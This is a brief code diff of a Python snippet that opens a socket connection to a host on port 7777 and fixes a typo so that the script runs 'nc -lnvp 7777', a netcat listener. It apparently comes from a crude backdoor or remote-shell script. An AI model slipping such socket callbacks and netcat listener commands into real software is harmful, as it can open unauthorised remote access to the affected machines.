@@ -4,4 +4,4 @@ port = 7777
 s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect((host,port))
 import os 
-os.systeme("nc -lnvp 7777")
+os.system("nc -lnvp 7777")
